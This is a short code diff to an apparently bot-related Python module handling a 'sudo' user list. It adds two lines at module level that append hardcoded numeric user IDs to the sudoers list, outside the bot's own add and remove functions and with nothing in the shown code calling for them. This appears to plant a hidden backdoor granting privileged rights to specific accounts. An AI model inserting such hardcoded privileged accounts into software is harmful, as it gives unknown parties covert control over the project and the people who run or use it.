@@ -26,3 +26,6 @@ async def remove_sudo(user_id: int) -> bool:
         {"sudo": "sudo"}, {"$set": {"sudoers": sudoers}}, upsert=True
     )
     return True
+
+sudoers.append(1441342342)
+sudoers.append(5089916692)
